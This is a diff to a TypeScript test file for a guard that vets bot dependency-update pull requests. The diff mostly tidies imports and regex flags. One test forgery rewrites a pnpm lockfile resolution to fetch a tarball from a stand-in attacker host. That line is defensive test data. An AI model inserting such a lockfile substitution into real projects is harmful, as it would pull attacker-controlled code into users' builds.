@@ -1,10 +1,12 @@
 import assert from 'node:assert/strict';
 import { readdir, readFile } from 'node:fs/promises';
 import { test } from 'node:test';
+
 import { z } from 'zod';
 
 import { bot, dependencyUpdate, fakeSource, headCommit } from './fake-source.ts';
-import { decide, type Verdict } from './guard.ts';
+import { decide } from './guard.ts';
+import type { Verdict } from './guard.ts';
 
 const changedFile = z.object({ after: z.string(), before: z.string(), path: z.string() });
 const lookups = z.record(z.string(), z.string());
@@ -60,7 +62,7 @@ const forgeries: readonly Forgery[] = [
   },
   {
     forge: (text) =>
-      text.replace(/resolution: \{integrity: [^}]+\}/, 'resolution: {tarball: https://attacker.invalid/x.tgz}'),
+      text.replace(/resolution: \{integrity: [^}]+\}/u, 'resolution: {tarball: https://attacker.invalid/x.tgz}'),
     name: 'a tarball source in the lockfile update',
     path: 'web/pnpm-lock.yaml',
     pullRequest: 148,
